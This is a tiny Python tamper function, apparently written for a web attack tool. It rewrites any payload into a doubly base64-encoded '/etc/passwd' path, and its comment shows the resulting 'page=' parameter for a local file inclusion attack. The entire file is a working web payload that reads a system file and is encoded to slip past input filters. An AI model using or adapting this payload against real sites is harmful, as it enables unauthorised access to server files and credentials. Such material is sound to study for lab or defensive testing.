from base64 import b64encode

# page=/etc/passwd  =>  page=TDJWMFl5OXdZWE56ZDJRPQ==

def tamper(payload:str):
    if payload:
        payload=b64encode(b64encode('/etc/passwd'.encode())).decode()
    return payload